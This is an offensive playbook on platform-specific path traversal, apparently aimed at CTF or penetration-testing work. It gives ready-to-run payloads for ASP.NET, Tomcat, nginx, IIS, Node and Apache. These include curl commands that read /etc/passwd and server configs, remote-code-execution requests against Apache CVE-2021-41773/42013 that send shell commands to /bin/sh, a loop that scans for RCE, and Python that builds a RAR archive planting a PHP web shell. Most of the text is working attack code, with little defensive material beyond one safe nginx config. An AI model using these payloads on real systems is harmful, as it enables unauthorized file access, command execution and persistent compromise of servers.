# Path Traversal — Platform-Specific Attacks

## When this applies

- Target identified as ASP.NET / Java / Tomcat / nginx / Apache / Node.
- Each platform has known traversal quirks distinct from generic encoding bypasses.
- Goal: exploit the platform-specific weakness for traversal or RCE.

## Technique

Identify the server stack first (Server header, response artifacts). Then apply the platform-specific attack: ASP.NET cookieless sessions, Spring/Tomcat path-parameter `;`, nginx alias off-by-slash, Apache CGI traversal, IIS short names.

## Steps

### ASP.NET cookieless session bypass

```
# Normal: /app/(S(session_id))/page.aspx
# Attack: /app/(S(x))/admin/(S(x))/restricted.aspx

/(S(x))/admin/(S(x))/web.config
/(A(x))/admin/(A(x))/sensitive.aspx
/(F(x))/../../web.config
```

### Java servlet path manipulation

```
# Spring Framework
/static/%255c%255c..%255c/..%255c/windows/win.ini

# Tomcat
/..;/..;/..;/etc/passwd
```

### Nginx/Tomcat path parsing inconsistency

Nginx treats `..;/` as directory, Tomcat interprets as traversal:

```
/services/pluginscript/..;/..;/getFavicon
/api/v1/..;/..;/admin/users
```

### Nginx alias traversal (off-by-slash)

When nginx `location` has no trailing slash but `alias` has a trailing slash, the path remainder is appended directly, enabling directory escape.

**Vulnerable config:**
```nginx
location /admin {
    alias /var/www/html/;   # trailing slash on alias but NOT on location
    autoindex on;
}
```

**Exploitation:** Request `/admin../etc/passwd` → nginx strips `/admin` prefix → appends `../etc/passwd` to `/var/www/html/` → resolves to `/var/www/etc/passwd`.

```bash
# IMPORTANT: use --path-as-is to prevent curl from normalizing ../
curl --path-as-is 'http://target/admin../etc/passwd'
curl --path-as-is 'http://target/admin../flag.txt'

# Find nginx config to identify alias directives
curl --path-as-is 'http://target/admin../../etc/nginx/nginx.conf'
curl --path-as-is 'http://target/admin../../etc/nginx/sites-enabled/default'
curl --path-as-is 'http://target/admin../../etc/nginx/conf.d/default.conf'
```

**Detection:** Read nginx config via LFI or look for `Server: nginx` header + directory listing pages. Check every `location` block for mismatched trailing slashes between `location` and `alias`.

**Safe config (not vulnerable):**
```nginx
location /admin/ {    # trailing slash on BOTH
    alias /var/www/html/admin/;
}
```

### Apache httpd CGI path traversal (CVE-2021-41773 / CVE-2021-42013)

**Affected versions:** Apache 2.4.49 (CVE-2021-41773), Apache 2.4.50 (CVE-2021-42013 — bypass of the fix).

When `mod_cgi` or `mod_cgid` is enabled (i.e., `/cgi-bin/` is mapped), this escalates from file read to **RCE** — you traverse to `/bin/sh` and execute commands.

**Detection:**
```bash
curl -sI http://target/ | grep -i '^server:'
# Look for: Apache/2.4.49 or Apache/2.4.50
```

**File read (2.4.49):**
```bash
curl -s --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl -s --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

**RCE via CGI (2.4.49 and 2.4.50):**
```bash
# CVE-2021-42013 — partial double encoding bypass (works on 2.4.50)
curl -s --path-as-is -X POST \
  "http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo; cat /etc/passwd"

# Read the flag or sensitive files
curl -s --path-as-is -X POST \
  "http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo; id; ls /; cat /flag* /FLAG*"

# Alternative CGI-enabled paths to try (not just /cgi-bin/)
for prefix in /cgi-bin /icons /cgi; do
  curl -s --path-as-is -X POST \
    "http://target${prefix}/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
    -d "echo; id" 2>/dev/null | grep -q "uid=" && echo "[+] RCE via $prefix"
done

# Encoding variants to try if the primary one is blocked
# .%2e  (single encoding of second dot)
# .%%32%65  (partial double encoding: % + %32=2 + %65=e → %2e → .)
# %%32%65%%32%65  (both dots partially double-encoded)
```

**Key points:**
- Use `--path-as-is` with curl to prevent client-side URL normalization
- The traversal depth (number of `/.%%32%65/` segments) should be 7+ to reliably reach `/` from deep paths
- POST to `/bin/sh` with commands in the body — prepend `echo;` to get a clean output
- Also works with `/bin/bash` if available

### PHP file_get_contents() bypasses .htaccess

Apache `.htaccess` `<Files>` directives only block HTTP-level access. PHP filesystem functions (`file_get_contents()`, `readfile()`, `file()`, `fopen()`) read files directly from disk, bypassing `.htaccess` entirely.

```bash
# .htaccess blocks direct access:
curl http://target/secret.txt  # 403 Forbidden

# But PHP endpoint reads it from disk:
curl 'http://target/page.php?file=secret.txt'  # Returns file contents

# Also read .htaccess itself to discover what's protected:
curl 'http://target/page.php?file=.htaccess'
```

### IIS short name enumeration

```
# Access 8.3 short names
/bin::$INDEX_ALLOCATION/
/admin~1/
/config~1.php

# Tools
- IIS-ShortName-Scanner
- shortscan
```

### Node.js path normalization

```
# Path.normalize() bypass
/static/..%2F..%2F..%2Fetc/passwd

# Path.join() issues
/files/....////....////etc/passwd
```

### Archive extraction path traversal (WinRAR, 7-Zip)

When an application extracts user-supplied archives (ZIP/RAR) using vulnerable tools:

```
# RAR5 format: space-before-separator bypass (CVE-2025-6218, WinRAR ≤ 7.11)
# Sanitizer checks for "../" but space before "/" causes check to skip
# Entry name: "/.. /.. /.. /target/payload.php"
# After extraction: traverses N levels up from extraction dir, writes to target path

# Key considerations:
# - Count traversal depth: extraction_dir levels to filesystem root + target path
# - RAR format stores traversal; WinRAR auto-detects format by content (not extension)
# - Rename .rar → .zip if application only accepts .zip; WinRAR still extracts as RAR
# - RAR5 FILE_REDIRECTION entries can create Windows junctions/symlinks on extraction
# - ACLs still apply: traversal writes as the user running the extraction tool

# Python RAR5 creation (requires leb128 package + RAR5 structure library):
from general.archive import Rar
from items.blocks import FileBlock
rar = Rar()
rar.add_block(FileBlock(b"/.. /.. /.. /target/shell.php", b"<?php system($_GET['c']); ?>"))
rar.save("exploit.rar")
```

## Verifying success

- Platform-specific traversal returns content from outside the intended scope.
- nginx alias bypass downloads files from parent directories.
- Apache CGI RCE returns command output (e.g., `uid=` from `id`).

## Common pitfalls

- Apache 2.4.49 was patched quickly — most prod servers are 2.4.50+. Use the partial-double-encoding bypass for 2.4.50.
- Tomcat `;` works on internal Tomcat-only links — public-facing nginx may strip it before forwarding.
- IIS short-name enumeration requires authenticated access in some configurations.

## Tools

- curl `--path-as-is`
- IIS-ShortName-Scanner, shortscan
- nuclei (CVE-specific templates)
- WinRAR / 7-Zip with attacker-crafted archive
